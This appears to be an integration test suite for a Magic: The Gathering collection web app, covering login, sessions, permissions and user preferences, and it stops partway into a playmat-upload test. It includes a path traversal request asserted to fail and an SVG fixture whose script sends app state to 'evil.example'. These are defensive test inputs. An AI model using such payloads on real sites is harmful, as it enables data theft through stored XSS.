'use strict';
/**
 * MTG Tools — Integration Tests
 * Run: npm test
 * Uses node:test (Node 18+) + supertest.
 */
const { test, describe, before, after, beforeEach } = require('node:test');
const assert   = require('node:assert/strict');
const supertest = require('supertest');
const path      = require('path');
const fs        = require('fs');
const Database  = require('better-sqlite3');

// ── Test database (isolated in-memory) ────────────────────────────────────────
// We patch DATA_FILE to a temp dir and override the db path before requiring server.
const tmpDir = fs.mkdtempSync(path.join(require('os').tmpdir(), 'mtgtest-'));
process.env.DATA_FILE      = path.join(tmpDir, 'state.json');
process.env.ADMIN_PASSWORD = 'testpass';
process.env.PORT           = '0'; // random port
process.env.AUTH_RATE_LIMIT_MAX = '1000'; // don't trip the login limiter in tests
// Low enough that one test can reach it in a few requests. The limiter is
// reset between tests (see the playmat suite), so a small ceiling costs the
// rest of the suite nothing.
process.env.UPLOAD_RATE_LIMIT_MAX = '4';
// No bulk download, no set-index sweep: the suite asserts nothing about
// either, and both would reach out to Scryfall on every run.
process.env.MTGTOOLS_NO_BACKGROUND = '1';

// Patch available-db to use a temp SQLite file so tests don't touch production data
const dbPath = path.join(tmpDir, 'test.db');
// Override the db module before it's loaded
const OriginalDatabase = require('better-sqlite3');
// Preload available-db with a clean DB
const dbModule = require('../available-db');

// Wipe all tables for a clean state between test suites
function resetDb() {
  const db = dbModule.db;
  db.exec(`
    DELETE FROM sessions;
    DELETE FROM users WHERE username != 'admin';
    DELETE FROM account_requests;
    DELETE FROM app_state;
    DELETE FROM collections;
    DELETE FROM availability;
    DELETE FROM deck_cards;
    DELETE FROM deck_categories;
    DELETE FROM user_prefs;
  `);
  // Re-seed admin from env
  const bcrypt = require('bcryptjs');
  const hash   = bcrypt.hashSync(process.env.ADMIN_PASSWORD, 10);
  db.prepare(`
    INSERT INTO users (username, password_hash, role, player_id) VALUES ('admin', ?, 'admin', NULL)
    ON CONFLICT(username) DO UPDATE SET password_hash = excluded.password_hash, role = 'admin'
  `).run(hash);
}

// Load app AFTER env setup
const { app, server: getServer } = require('../server');
const request  = supertest(app);

// ── Helper: login and get cookie ──────────────────────────────────────────────
async function loginAs(username, password) {
  const res = await request
    .post('/api/auth/login')
    .send({ username, password })
    .set('Content-Type', 'application/json');
  const setCookie = res.headers['set-cookie'];
  if (!setCookie) return null;
  const raw = Array.isArray(setCookie) ? setCookie[0] : setCookie;
  // Extract just the token part from "mtg_session=<token>; ..."
  return raw.split(';')[0]; // "mtg_session=<token>"
}

// ── /healthz ─────────────────────────────────────────────────────────────────
describe('GET /healthz', () => {
  test('returns ok without auth', async () => {
    const res = await request.get('/healthz');
    assert.equal(res.status, 200);
    assert.equal(res.body.ok, true);
    assert.ok(typeof res.body.uptime === 'number');
  });
});

// ── Assets the login page needs ──────────────────────────────────────────────
// The static mount sits behind the auth guard, so anything the sign-in screen
// loads has to be served by a route in front of it. Two things are: the token
// file, and the typeface its @font-face rules point at. Behind the guard a
// font request is answered with a redirect to /login, the face fails to
// decode, and the login page alone falls back to the system stack.
describe('Public assets', () => {
  test('the token stylesheet is served without auth', async () => {
    const res = await request.get('/css/tokens.css');
    assert.equal(res.status, 200);
    assert.match(res.headers['content-type'], /text\/css/);
  });

  test('the typeface is served without auth', async () => {
    for (const file of fs.readdirSync(path.join(__dirname, '..', 'public', 'fonts'))
                        .filter(f => f.endsWith('.woff2'))) {
      const res = await request.get(`/fonts/${file}`);
      assert.equal(res.status, 200, `/fonts/${file}`);
      assert.match(res.headers['content-type'], /font\/woff2/);
    }
  });

  test('the fonts route serves fonts and nothing else', async () => {
    // A static mount two levels above its directory is the classic way to
    // leak a database, so the traversal is worth an assertion.
    const res = await request.get('/fonts/../../data/available.db');
    assert.notEqual(res.status, 200);
  });
});

// ── Vendored libraries ───────────────────────────────────────────────────────
// The symbol font and the PDF library used to come off two CDNs; they are
// served from public/vendor now, so this app must actually hand them over —
// with the content types that make a browser use them. test/offline.test.js
// asserts what is in the files; this asserts that they arrive.
describe('Vendored libraries', () => {
  const AS = { 'vendor/mana.min.css': /text\/css/,
               'vendor/mana.woff2': /font\/woff2/,
               'vendor/jspdf.umd.min.js': /javascript/ };

  test('each is served to a signed-in browser', async () => {
    const cookie = await loginAs('admin', 'testpass');
    for (const [file, type] of Object.entries(AS)) {
      const res = await request.get(`/${file}`).set('Cookie', cookie);
      assert.equal(res.status, 200, `/${file}`);
      assert.match(res.headers['content-type'], type, `/${file}`);
    }
  });
});

// ── Login / logout ─────────────────────────────────────────────────────────────
describe('Auth: login / logout', () => {
  beforeEach(resetDb);

  test('login with correct credentials returns ok + cookie', async () => {
    const res = await request
      .post('/api/auth/login')
      .send({ username: 'admin', password: 'testpass' });
    assert.equal(res.status, 200);
    assert.equal(res.body.ok, true);
    assert.equal(res.body.user.username, 'admin');
    assert.ok(res.headers['set-cookie'], 'should set cookie');
  });

  test('login trims password whitespace', async () => {
    const res = await request
      .post('/api/auth/login')
      .send({ username: 'admin', password: '  testpass  ' });
    assert.equal(res.status, 200);
    assert.equal(res.body.ok, true);
  });

  test('login with wrong password returns 401', async () => {
    const res = await request
      .post('/api/auth/login')
      .send({ username: 'admin', password: 'wrongpass' });
    assert.equal(res.status, 401);
  });

  test('logout clears session', async () => {
    const cookie = await loginAs('admin', 'testpass');
    assert.ok(cookie);
    const out = await request.post('/api/auth/logout').set('Cookie', cookie);
    assert.equal(out.status, 200);
    // After logout, /api/auth/me should return 401
    const me = await request.get('/api/auth/me').set('Cookie', cookie);
    assert.equal(me.status, 401);
  });

  test('session is persisted in SQLite', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const db = dbModule.db;
    const rows = db.prepare('SELECT COUNT(*) AS n FROM sessions').get();
    assert.ok(rows.n >= 1, 'session row should exist in DB');
    // Logout removes the row
    await request.post('/api/auth/logout').set('Cookie', cookie);
    const after = db.prepare('SELECT COUNT(*) AS n FROM sessions').get();
    assert.equal(after.n, 0);
  });
});

// ── Session expiry ─────────────────────────────────────────────────────────────
describe('Auth: session expiry', () => {
  beforeEach(resetDb);

  test('expired session is rejected', async () => {
    const { createSession } = require('../middleware/auth');
    // Create a session that already expired
    const token = createSession('admin', 'admin', null);
    const db    = dbModule.db;
    // Manually set expires_at to the past
    const { createHash } = require('crypto');
    const hash = createHash('sha256').update(token).digest('hex');
    db.prepare('UPDATE sessions SET expires_at = ? WHERE token_hash = ?').run(Date.now() - 1000, hash);
    // Request with expired token
    const res = await request.get('/api/auth/me')
      .set('Cookie', `mtg_session=${encodeURIComponent(token)}`);
    assert.equal(res.status, 401);
  });
});

// ── requireAdmin ───────────────────────────────────────────────────────────────
describe('Auth middleware: requireAdmin', () => {
  beforeEach(resetDb);

  test('admin can access /api/admin/users', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const res    = await request.get('/api/admin/users').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body));
  });

  test('player cannot access /api/admin/users', async () => {
    // Register a player account
    const db     = dbModule.db;
    const bcrypt = require('bcryptjs');
    const hash   = bcrypt.hashSync('playerpass', 10);
    db.prepare("INSERT INTO users (username, password_hash, role) VALUES ('player1', ?, 'player')").run(hash);
    const cookie = await loginAs('player1', 'playerpass');
    const res    = await request.get('/api/admin/users').set('Cookie', cookie);
    assert.equal(res.status, 403);
  });

  test('unauthenticated request returns 401', async () => {
    const res = await request.get('/api/admin/users');
    assert.equal(res.status, 401);
  });
});

// ── requirePlayerAccess ────────────────────────────────────────────────────────
describe('Auth middleware: requirePlayerAccess', () => {
  let playerId;
  let playerCookie;
  let otherCookie;

  beforeEach(() => {
    resetDb();
    const db     = dbModule.db;
    const bcrypt = require('bcryptjs');
    const { v4: uuidv4 } = require('uuid');
    playerId = uuidv4();

    // Create the player in state
    db.prepare("INSERT OR REPLACE INTO app_state (key, value_json, version) VALUES ('state', ?, 0)")
      .run(JSON.stringify({ players: [{ id: playerId, name: 'P1', decks: [], wantList: [] }] }));

    const h1 = bcrypt.hashSync('pw1', 10);
    const h2 = bcrypt.hashSync('pw2', 10);
    db.prepare("INSERT INTO users (username, password_hash, role, player_id) VALUES ('p1user', ?, 'player', ?)").run(h1, playerId);
    db.prepare("INSERT INTO users (username, password_hash, role, player_id) VALUES ('p2user', ?, 'player', NULL)").run(h2);
  });

  beforeEach(async () => {
    playerCookie = await loginAs('p1user', 'pw1');
    otherCookie  = await loginAs('p2user', 'pw2');
  });

  test('player can update their own decks', async () => {
    const res = await request
      .put(`/api/players/${playerId}/decks`)
      .set('Cookie', playerCookie)
      .send({ decks: [] });
    assert.equal(res.status, 200);
  });

  test('other player cannot update another player\'s decks', async () => {
    const res = await request
      .put(`/api/players/${playerId}/decks`)
      .set('Cookie', otherCookie)
      .send({ decks: [] });
    assert.equal(res.status, 403);
  });

  test('admin can update any player\'s decks', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const res = await request
      .put(`/api/players/${playerId}/decks`)
      .set('Cookie', cookie)
      .send({ decks: [] });
    assert.equal(res.status, 200);
  });

  test('granular deck PUT returns the bumped state version', async () => {
    const r1 = await request
      .put(`/api/players/${playerId}/decks`)
      .set('Cookie', playerCookie)
      .send({ decks: [{ id: 'd1', name: 'Deck', source: 'manual' }] });
    assert.equal(r1.status, 200);
    assert.ok(typeof r1.body.version === 'number' && r1.body.version >= 1,
      'PUT /decks should return the new version so clients stay in sync');
    // A whole-state POST with that version must NOT 409
    const r2 = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [{ id: playerId, name: 'P1', decks: [{ id: 'd1', name: 'Deck', source: 'manual' }], wantList: [] }], version: r1.body.version });
    assert.equal(r2.status, 200);
  });

  test('want add/remove return the state version', async () => {
    const add = await request
      .post(`/api/players/${playerId}/wants`)
      .set('Cookie', playerCookie)
      .send({ cardName: 'Sol Ring' });
    assert.equal(add.status, 200);
    assert.ok(typeof add.body.version === 'number');
    const del = await request
      .delete(`/api/players/${playerId}/wants/${encodeURIComponent('Sol Ring')}`)
      .set('Cookie', playerCookie);
    assert.equal(del.status, 200);
    assert.ok(typeof del.body.version === 'number');
    assert.ok(del.body.version > add.body.version);
  });
});

// ── /api/state permission rules (non-admin) ───────────────────────────────────
describe('POST /api/state - non-admin permission rules', () => {
  let playerId;
  let playerCookie;
  let adminCookie;

  beforeEach(async () => {
    resetDb();
    const db     = dbModule.db;
    const bcrypt = require('bcryptjs');
    const { v4: uuidv4 } = require('uuid');
    playerId = uuidv4();

    db.prepare("INSERT OR REPLACE INTO app_state (key, value_json, version) VALUES ('state', ?, 0)")
      .run(JSON.stringify({ players: [{ id: playerId, name: 'P1', decks: [], wantList: [] }] }));

    const h = bcrypt.hashSync('pp', 10);
    db.prepare("INSERT INTO users (username, password_hash, role, player_id) VALUES ('myplayer', ?, 'player', ?)").run(h, playerId);

    playerCookie = await loginAs('myplayer', 'pp');
    adminCookie  = await loginAs('admin', 'testpass');
  });

  test('non-admin cannot add players', async () => {
    const { v4: uuidv4 } = require('uuid');
    const res = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', decks: [], wantList: [] },
        { id: uuidv4(), name: 'Intruder', decks: [], wantList: [] },
      ], version: 0 });
    assert.equal(res.status, 403);
  });

  test('non-admin cannot modify another player\'s decks', async () => {
    const res = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', decks: [{ id: 'd1', name: 'Stolen Deck', source: 'manual', wantList: [] }], wantList: [] },
      ], version: 0 });
    // This player owns playerId so they CAN modify their own decks
    assert.equal(res.status, 200);
  });

  test('non-admin cannot modify another player\'s want list / name / color', async () => {
    const { v4: uuidv4 } = require('uuid');
    const db = dbModule.db;
    const otherId = uuidv4();
    // Add a second player to state
    const cur = JSON.parse(db.prepare("SELECT value_json FROM app_state WHERE key='state'").get().value_json);
    cur.players.push({ id: otherId, name: 'Other', color: '#fff', decks: [], wantList: ['Sol Ring'] });
    db.prepare("UPDATE app_state SET value_json = ? WHERE key='state'").run(JSON.stringify(cur));

    // Tampering with the other player's wantList must be rejected
    const res = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', decks: [], wantList: [] },
        { id: otherId, name: 'Other', color: '#fff', decks: [], wantList: [] }, // removed Sol Ring
      ], version: 0 });
    assert.equal(res.status, 403);

    // Renaming the other player must also be rejected
    const res2 = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', decks: [], wantList: [] },
        { id: otherId, name: 'Hacked', color: '#fff', decks: [], wantList: ['Sol Ring'] },
      ], version: 0 });
    assert.equal(res2.status, 403);

    // Leaving the other player untouched is still allowed
    const res3 = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1 renamed', decks: [], wantList: ['Lightning Bolt'] },
        { id: otherId, name: 'Other', color: '#fff', decks: [], wantList: ['Sol Ring'] },
      ], version: 0 });
    assert.equal(res3.status, 200);
  });

  /* The player palette moved from a stored hex to a stored slot (--player-N).
     Both forms name the same colour, so a client that has migrated is not
     editing the players it re-sends — which is the whole risk of the move:
     this guard compares every *other* player value-by-value, so if the two
     spellings compared unequal, the first save after an upgrade would be
     refused for everyone but an admin. */
  test('a player re-sent as a slot instead of a legacy hex is not a change', async () => {
    const { v4: uuidv4 } = require('uuid');
    const db = dbModule.db;
    const otherId = uuidv4();
    const cur = JSON.parse(db.prepare("SELECT value_json FROM app_state WHERE key='state'").get().value_json);
    // '#06b6d4' is index 1 of the palette the server used to assign from.
    cur.players.push({ id: otherId, name: 'Other', color: '#06b6d4', decks: [], wantList: ['Sol Ring'] });
    db.prepare("UPDATE app_state SET value_json = ? WHERE key='state'").run(JSON.stringify(cur));

    const res = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', colorIdx: 0, decks: [], wantList: ['Lightning Bolt'] },
        { id: otherId, name: 'Other', colorIdx: 1, decks: [], wantList: ['Sol Ring'] },
      ], version: 0 });
    assert.equal(res.status, 200);

    // The other player's colour is still theirs to choose, though: a
    // different slot is a different value and is refused like any other.
    const res2 = await request
      .post('/api/state')
      .set('Cookie', playerCookie)
      .send({ players: [
        { id: playerId, name: 'P1', colorIdx: 0, decks: [], wantList: ['Lightning Bolt'] },
        { id: otherId, name: 'Other', colorIdx: 5, decks: [], wantList: ['Sol Ring'] },
      ], version: res.body.version });
    assert.equal(res2.status, 403);
  });

  test('admin can post anything', async () => {
    const { v4: uuidv4 } = require('uuid');
    const res = await request
      .post('/api/state')
      .set('Cookie', adminCookie)
      .send({ players: [
        { id: playerId, name: 'P1', decks: [], wantList: [] },
        { id: uuidv4(), name: 'NewPlayer', decks: [], wantList: [] },
      ], version: 0 });
    assert.equal(res.status, 200);
  });
});

// ── Version conflict 409 ───────────────────────────────────────────────────────
describe('POST /api/state - optimistic concurrency 409', () => {
  beforeEach(resetDb);

  test('returns 409 when version is stale', async () => {
    const cookie = await loginAs('admin', 'testpass');
    // First write sets version to 1
    await request.post('/api/state').set('Cookie', cookie).send({ players: [], version: 0 });
    // Second write with wrong version (still 0) should conflict
    const res = await request.post('/api/state').set('Cookie', cookie).send({ players: [], version: 0 });
    assert.equal(res.status, 409);
  });

  test('returns ok when version is current', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const r1 = await request.post('/api/state').set('Cookie', cookie).send({ players: [], version: 0 });
    assert.equal(r1.status, 200);
    const { version } = r1.body;
    const r2 = await request.post('/api/state').set('Cookie', cookie).send({ players: [], version });
    assert.equal(r2.status, 200);
  });
});

// ── Account request → approve flow ────────────────────────────────────────────
describe('Account request → approve flow', () => {
  beforeEach(resetDb);

  test('full flow: request → approve → login', async () => {
    // 1. Request account
    const req1 = await request
      .post('/api/auth/request-account')
      .send({ username: 'newplayer', password: 'pass123' });
    assert.equal(req1.status, 200);

    // 2. Admin sees the pending request
    const adminCookie = await loginAs('admin', 'testpass');
    const list = await request.get('/api/admin/account-requests').set('Cookie', adminCookie);
    assert.equal(list.status, 200);
    assert.ok(list.body.some(r => r.username === 'newplayer'));
    const requestId = list.body.find(r => r.username === 'newplayer').id;

    // 3. Admin approves
    const approve = await request
      .post(`/api/admin/account-requests/${requestId}/approve`)
      .set('Cookie', adminCookie)
      .send({ role: 'player' });
    assert.equal(approve.status, 200);

    // 4. New player can log in
    const login = await request
      .post('/api/auth/login')
      .send({ username: 'newplayer', password: 'pass123' });
    assert.equal(login.status, 200);
    assert.equal(login.body.user.username, 'newplayer');
  });

  test('duplicate username request returns 409', async () => {
    await request.post('/api/auth/request-account').send({ username: 'dup', password: 'pass123' });
    const res = await request.post('/api/auth/request-account').send({ username: 'dup', password: 'pass456' });
    assert.equal(res.status, 409);
  });
});

// ── Set Browser data ──────────────────────────────────────────────────────────
// The endpoint behind the set tiles. Its whole job is a join the browser
// cannot do — a collection knows card names, the index knows which set holds
// which name — so the join is what is tested, with both sides seeded by hand.
describe('GET /api/sets', () => {
  const setIndex = require('../set-index');
  const scrydb   = require('../scryfall-db').db;

  before(() => {
    // Stand the background sweep down first: it writes to the same two tables
    // and would race the fixture. The fixture's set codes are not real ones,
    // so a set-list refresh that is already in flight cannot touch them.
    setIndex.stop();
    scrydb.exec(`DELETE FROM sets WHERE code IN ('tst', 'unx');
                 DELETE FROM set_cards WHERE code IN ('tst', 'unx');`);
    scrydb.prepare(`INSERT INTO sets (code, name, released_at, set_type, card_count, indexed, indexed_of)
                    VALUES (?, ?, ?, 'expansion', ?, ?, ?)`)
      .run('tst', 'Test Set', '2020-01-01', 3, 3, 3);
    scrydb.prepare(`INSERT INTO sets (code, name, released_at, set_type, card_count, indexed, indexed_of)
                    VALUES (?, ?, ?, 'expansion', ?, NULL, NULL)`)
      .run('unx', 'Unindexed Set', '2019-01-01', 40);
    const addCard = scrydb.prepare('INSERT OR IGNORE INTO set_cards (code, name) VALUES (?, ?)');
    for (const n of ['Sol Ring', 'Llanowar Elves', 'Black Lotus']) addCard.run('tst', n);
  });

  beforeEach(() => {
    resetDb();
    // One collection holding two of Test Set's three cards. "llanowar elves"
    // is lower-case on purpose: a hand-rolled CSV writes names how it likes,
    // and the index matches them case-insensitively.
    dbModule.db.prepare(`
      INSERT INTO collections (key, name, source, col_id, color, cards_json, entries, total, saved_at)
      VALUES ('csv:1', 'Tim', 'csv-archidekt', NULL, '#a855f7', ?, 2, 2, NULL)
    `).run(JSON.stringify({
      'Sol Ring':       { name: 'Sol Ring', qty: 1 },
      'llanowar elves': { name: 'llanowar elves', qty: 4 },
    }));
  });

  test('requires auth', async () => {
    const res = await request.get('/api/sets');
    assert.equal(res.status, 401);
  });

  test('counts a set\'s owned cards from the collections', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const res    = await request.get('/api/sets').set('Cookie', cookie);
    assert.equal(res.status, 200);
    const set = res.body.sets.find(s => s.code === 'tst');
    assert.ok(set, 'the seeded set is in the list');
    assert.equal(set.indexed, true);
    assert.equal(set.cards, 3);
    assert.equal(set.owned, 2);   // Sol Ring + llanowar elves; not Black Lotus
  });

  test('a set the index has not reached reports no owned figure', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const res    = await request.get('/api/sets').set('Cookie', cookie);
    const set    = res.body.sets.find(s => s.code === 'unx');
    assert.equal(set.indexed, false);
    assert.equal(set.owned, null);   // null, not 0 — nothing known is not none owned
    assert.equal(set.cards, 40);     // Scryfall's printing count, as a stand-in
  });

  test('owning nothing is zero rather than missing', async () => {
    dbModule.db.exec("DELETE FROM collections");
    const cookie = await loginAs('admin', 'testpass');
    const res    = await request.get('/api/sets').set('Cookie', cookie);
    assert.equal(res.body.sets.find(s => s.code === 'tst').owned, 0);
  });

  test('reports how far the index has got', async () => {
    const cookie = await loginAs('admin', 'testpass');
    const res    = await request.get('/api/sets').set('Cookie', cookie);
    assert.equal(typeof res.body.index.sets, 'number');
    assert.equal(typeof res.body.index.indexed, 'number');
    assert.ok(res.body.index.sets >= res.body.index.indexed);
  });
});

// ── User preferences ──────────────────────────────────────────────────────────
// Appearance stops being per-browser and starts belonging to a person, so what
// is worth asserting is that it comes back on a different session, that it is
// only ever the caller's own, and that it does not outlive the account.
describe('User preferences: /api/prefs', () => {
  const bcrypt = require('bcryptjs');

  function addUser(username, password) {
    dbModule.db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)')
      .run(username, bcrypt.hashSync(password, 10), 'player');
  }

  beforeEach(() => {
    resetDb();
    addUser('alice', 'apw');
    addUser('bob',   'bpw');
  });

  test('requires auth', async () => {
    assert.equal((await request.get('/api/prefs')).status, 401);
    assert.equal((await request.put('/api/prefs').send({ theme: 'light' })).status, 401);
  });

  test('a user who has never set anything gets the defaults', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res    = await request.get('/api/prefs').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.equal(res.body.theme, 'dark');
    assert.equal(res.body.playmatKind, 'none');
    assert.equal(res.body.playmatRef, null);
    assert.equal(res.body.playmatUrl, null);
    assert.equal(res.body.cardMotion, 'on', 'cards move until someone says otherwise');
    assert.equal(res.body.stored, true, 'with accounts, the server is the record');
  });

  test('a theme set on one device is there on the next sign-in', async () => {
    const first = await loginAs('alice', 'apw');
    const set   = await request.put('/api/prefs').set('Cookie', first).send({ theme: 'sepia' });
    assert.equal(set.status, 200);
    assert.equal(set.body.theme, 'sepia');

    // A second session is the other device: same user, a cookie that has never
    // seen the first one, and no browser storage in the picture at all.
    const second = await loginAs('alice', 'apw');
    assert.notEqual(second, first);
    const res = await request.get('/api/prefs').set('Cookie', second);
    assert.equal(res.body.theme, 'sepia');
  });

  test('an unknown theme is rejected', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res    = await request.put('/api/prefs').set('Cookie', cookie).send({ theme: 'neon' });
    assert.equal(res.status, 400);
    // and nothing was written
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.theme, 'dark');
  });

  test('the retired theme id is stored as the one it was renamed to', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res    = await request.put('/api/prefs').set('Cookie', cookie).send({ theme: 'forest' });
    assert.equal(res.status, 200);
    assert.equal(res.body.theme, 'dusk');
  });

  test('an invalid playmat kind is rejected', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res    = await request.put('/api/prefs').set('Cookie', cookie)
      .send({ playmatKind: 'billboard' });
    assert.equal(res.status, 400);
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.playmatKind, 'none');
  });

  test('a body carrying only the theme leaves the playmat alone', async () => {
    const cookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', cookie).send({
      playmatKind: 'scryfall', playmatRef: 'abc-123', playmatUrl: 'https://img.example/art.jpg',
    });
    const res = await request.put('/api/prefs').set('Cookie', cookie).send({ theme: 'light' });
    assert.equal(res.body.theme, 'light');
    assert.equal(res.body.playmatKind, 'scryfall');
    assert.equal(res.body.playmatRef, 'abc-123');
  });

  test('clearing the playmat clears what it pointed at', async () => {
    const cookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', cookie).send({
      playmatKind: 'scryfall', playmatRef: 'abc-123', playmatUrl: 'https://img.example/art.jpg',
    });
    const res = await request.put('/api/prefs').set('Cookie', cookie).send({ playmatKind: 'none' });
    assert.equal(res.body.playmatRef, null);
    assert.equal(res.body.playmatUrl, null);
  });

  // ── Card motion ─────────────────────────────────────────────────────────
  // The same promises the theme makes, asserted again rather than assumed:
  // it is a different column, a different validator and a different branch of
  // the patch, and "it follows the existing shape" is what these check.
  test('card motion set on one device is there on the next sign-in', async () => {
    const first = await loginAs('alice', 'apw');
    const set   = await request.put('/api/prefs').set('Cookie', first).send({ cardMotion: 'off' });
    assert.equal(set.status, 200);
    assert.equal(set.body.cardMotion, 'off');

    const second = await loginAs('alice', 'apw');
    assert.notEqual(second, first);
    assert.equal((await request.get('/api/prefs').set('Cookie', second)).body.cardMotion, 'off');
  });

  test('a card motion value that is neither on nor off is rejected', async () => {
    const cookie = await loginAs('alice', 'apw');
    for (const bad of ['maybe', true, 1, null, 'ON']) {
      const res = await request.put('/api/prefs').set('Cookie', cookie).send({ cardMotion: bad });
      assert.equal(res.status, 400, `${JSON.stringify(bad)} should not be storable`);
    }
    // and nothing was written by any of them
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.cardMotion, 'on');
  });

  test('a body carrying only card motion leaves the theme and the playmat alone', async () => {
    const cookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', cookie).send({
      theme: 'sepia',
      playmatKind: 'scryfall', playmatRef: 'abc-123', playmatUrl: 'https://img.example/art.jpg',
    });
    const res = await request.put('/api/prefs').set('Cookie', cookie).send({ cardMotion: 'off' });
    assert.equal(res.body.cardMotion, 'off');
    assert.equal(res.body.theme, 'sepia');
    assert.equal(res.body.playmatKind, 'scryfall');
    assert.equal(res.body.playmatRef, 'abc-123');
  });

  test('setting a theme or a playmat leaves card motion alone', async () => {
    const cookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', cookie).send({ cardMotion: 'off' });

    const themed = await request.put('/api/prefs').set('Cookie', cookie).send({ theme: 'light' });
    assert.equal(themed.body.cardMotion, 'off');

    const matted = await request.put('/api/prefs').set('Cookie', cookie).send({
      playmatKind: 'scryfall', playmatRef: 'abc-123', playmatUrl: 'https://img.example/art.jpg',
    });
    assert.equal(matted.body.cardMotion, 'off');

    // And clearing the mat, which rewrites the row from a different branch.
    const cleared = await request.put('/api/prefs').set('Cookie', cookie)
      .send({ playmatKind: 'none' });
    assert.equal(cleared.body.cardMotion, 'off');
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.cardMotion, 'off');
  });

  test('one user cannot read or modify another user\'s preferences', async () => {
    const aliceCookie = await loginAs('alice', 'apw');
    const bobCookie   = await loginAs('bob',   'bpw');
    await request.put('/api/prefs').set('Cookie', aliceCookie).send({ theme: 'sepia' });
    await request.put('/api/prefs').set('Cookie', bobCookie)
      .send({ theme: 'contrast', cardMotion: 'off' });

    // Bob turning motion off is Bob's business: Alice's cards still move.
    assert.equal((await request.get('/api/prefs').set('Cookie', aliceCookie)).body.cardMotion, 'on');
    assert.equal((await request.get('/api/prefs').set('Cookie', bobCookie)).body.cardMotion, 'off');

    // Each reads their own — there is no path parameter to name someone else's
    // with, which is what makes this structural rather than a check to forget.
    assert.equal((await request.get('/api/prefs').set('Cookie', aliceCookie)).body.theme, 'sepia');
    assert.equal((await request.get('/api/prefs').set('Cookie', bobCookie)).body.theme, 'contrast');

    // Bob writing again does not reach Alice's row, whatever he puts in the body.
    await request.put('/api/prefs').set('Cookie', bobCookie)
      .send({ theme: 'light', username: 'alice', user_id: 'alice' });
    assert.equal((await request.get('/api/prefs').set('Cookie', aliceCookie)).body.theme, 'sepia');
  });

  test('an admin\'s preferences are their own, not everyone\'s', async () => {
    const adminCookie = await loginAs('admin', 'testpass');
    const aliceCookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', adminCookie).send({ theme: 'contrast' });
    assert.equal((await request.get('/api/prefs').set('Cookie', aliceCookie)).body.theme, 'dark');
  });

  test('deleting a user removes their preferences', async () => {
    const aliceCookie = await loginAs('alice', 'apw');
    await request.put('/api/prefs').set('Cookie', aliceCookie).send({ theme: 'sepia' });
    assert.equal(dbModule.db.prepare('SELECT COUNT(*) AS n FROM user_prefs WHERE username = ?')
      .get('alice').n, 1);

    const adminCookie = await loginAs('admin', 'testpass');
    const del = await request.delete('/api/admin/users/alice').set('Cookie', adminCookie);
    assert.equal(del.status, 200);
    assert.equal(dbModule.db.prepare('SELECT COUNT(*) AS n FROM user_prefs WHERE username = ?')
      .get('alice').n, 0, 'the preference row goes with the account');

    // And an account created again under the same name starts from the
    // defaults rather than inheriting the deleted user's appearance.
    const create = await request.post('/api/admin/users').set('Cookie', adminCookie)
      .send({ username: 'alice', password: 'apw2' });
    assert.equal(create.status, 200);
    const cookie = await loginAs('alice', 'apw2');
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.theme, 'dark');
  });
});

// ── Playmat uploads ───────────────────────────────────────────────────────────
// The one route that turns a request body into a file this application later
// serves back on its own origin, so what is asserted is mostly what does *not*
// happen: nothing lands on disk that is not a raster image, nothing outlives
// the preference that points at it, and nobody reads anybody else's.
describe('Playmat uploads: /api/prefs/playmat', () => {
  const bcrypt   = require('bcryptjs');
  const playmats = require('../playmat-store');
  const { uploadLimiter } = require('../middleware/limits');

  // Real files, small enough to inline. Only their leading bytes matter to
  // the server, but using genuine images keeps the fixtures honest about what
  // is being accepted.
  const b64 = s => Buffer.from(s, 'base64');
  const PNG  = b64('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==');
  const WEBP = b64('UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=');
  const JPEG = b64('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==');
  const SVG  = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">' +
    '<script>fetch("/api/state").then(r=>r.text()).then(t=>fetch("//evil.example/"+t))</script></svg>');

  function addUser(username, password) {
